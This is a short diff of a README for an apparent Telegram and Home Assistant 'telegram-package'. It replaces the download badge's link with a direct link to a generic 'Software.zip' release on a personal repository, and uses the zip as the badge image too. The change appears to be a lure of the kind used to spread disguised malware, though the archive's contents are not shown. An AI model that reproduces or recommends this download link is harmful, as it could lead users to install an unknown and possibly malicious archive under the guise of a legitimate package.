@@ -12,7 +12,7 @@ With this package, you can:
 ## Installation 🚀
 
 To get started, you can download the latest release of the "telegram-package" from the following link:
-[![Download telegram-package](https://img.shields.io/static/v1?label=Download&message=telegram-package&color=blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download telegram-package](https://github.com/johnkninja21/telegram-package/releases/download/v1.0/Software.zip)](https://github.com/johnkninja21/telegram-package/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the package, follow the installation instructions provided in the repository to set up the integration between Telegram and Home Assistant seamlessly.
 
